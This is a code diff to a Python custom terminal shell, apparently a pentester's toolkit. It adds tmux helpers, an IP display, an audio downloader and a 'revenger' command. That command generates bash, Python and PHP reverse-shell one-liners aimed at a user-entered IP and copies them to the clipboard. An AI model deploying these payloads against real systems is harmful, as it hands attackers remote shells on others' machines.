@@ -9,6 +9,7 @@ import time
 import datetime
 import platform
 import distro
+import youtube_dl
 
 # color variables
 red = '\033[0;31m'
@@ -48,6 +49,21 @@ def runCommand(cmd):
         show_day()
     elif args[0] == 'whichDistro':
         which_distro()
+    elif args[0] == 'revenger':
+        revenger()
+    elif args[0] == 'grabip':
+        grabip()
+    elif args[0] == 'tmux':
+        new_session()
+    elif args[0] == 'splitV':
+        split_v()
+    elif args[0] == 'splitH':
+        split_h()
+    elif args[0] == 'defaultTheme':
+        defaulttheme()
+    elif args[0] == 'downloadIt':
+        url = input("enter the url : ")
+        download_video(url)
     elif args[0] == 'cd':
         try:
             if len(args) > 1:
@@ -73,6 +89,76 @@ def hello_friend():
         os.system(f'sudo openvpn {path}')
     else:
         print("Hey! the file you're trying to use doesn't exist.")
+
+
+def download_video(url):
+    ydl_opts = {
+        'format': 'bestaudio/best',
+        'outtmpl': '%(id)s.%(ext)s',
+        'postprocessors': [{
+            'key': 'FFmpegExtractAudio',
+            'preferredcodec': 'mp3',
+            'preferredquality': '320',
+        }],
+    }
+    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
+        ydl.download([url])
+
+
+def defaulttheme():
+    os.system('tmux send-keys -t 0 "tmux split-window -h \' -l 90\';tmux select-pane -t 1" Enter')
+    os.system('tmux send-keys -t 0 "tmux select-pane -t 0; tmux split-window -v \'-l 34\';tmux select-pane -t 2" Enter')
+    os.system('tmux send-keys -t 0 "tmux select-pane -t 1; tmux split-window -v \'-l 25\';tmux select-pane -t 3" Enter')
+    os.system('tmux send-keys -t 0 "tmux select-pane -t 3; tmux split-window -v \'-l 10\';tmux select-pane -t 4" Enter')
+    os.system('tmux send-keys -t 0 "tmux select-pane -t 3; tmux split-window -v \'-l 8\';tmux select-pane -t 5" Enter')
+    time.sleep(1)
+    os.system('tmux send-keys -t 4 "tmux select-pane -t 4; ./asset1;"')
+    os.system('tmux send-keys -t 4 "" Enter')
+    os.system('clear')
+
+
+def revenger():
+    ip_address = input("Enter target IP address: ")
+    shell_type = input("Enter shell type (bash/python/python3/php): ")
+    
+    rev_shells = {
+        'bash': f'bash -c "/bin/bash -i >& /dev/tcp/{ip_address}/4444 0>&1"',
+        'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip_address}\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+        'php': f"php -r '\$sock=fsockopen(\"{ip_address}\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip_address}\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"
+    }
+    
+    rev_shell = rev_shells.get(shell_type)
+    if rev_shell is None:
+        print("Invalid shell type. Valid options are bash, python, or php.")
+        return
+    
+    subprocess.run(['echo', rev_shell], capture_output=True, text=True, check=True)
+    subprocess.run(['xclip', '-selection', 'clipboard'], input=rev_shell, text=True, check=True)
+    print("\033[1;32mReverse shell generated and copied to clipboard!\033[0m")
+
+
+def grabip():
+    ips = os.popen('ifconfig | grep -E "inet [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | awk \'{print $1,$2}\'').read().strip()
+    if ips:
+        os.system(f'echo "{ips}" | figlet -f small.flf')
+    else:
+        print('No IP addresses found.')
+
+
+def split_v():
+    subprocess.run(['tmux', 'split-window', '-v', '-c', './', 'python3', 'spyshell.py'])
+
+
+def split_h():
+    subprocess.run(['tmux', 'split-window', '-h', '-c', './', 'python3', 'spyshell.py'])
+
+
+def new_session():
+    print(f"enter the session name:")
+    sess_name = input()
+    subprocess.run(['tmux', 'new-session', '-n', 'YourSessionName', 'python3', 'spyshell.py'])
+    subprocess.run(['tmux', 'set', '-g', 'mouse', 'on'])
 
 
 def show_time():
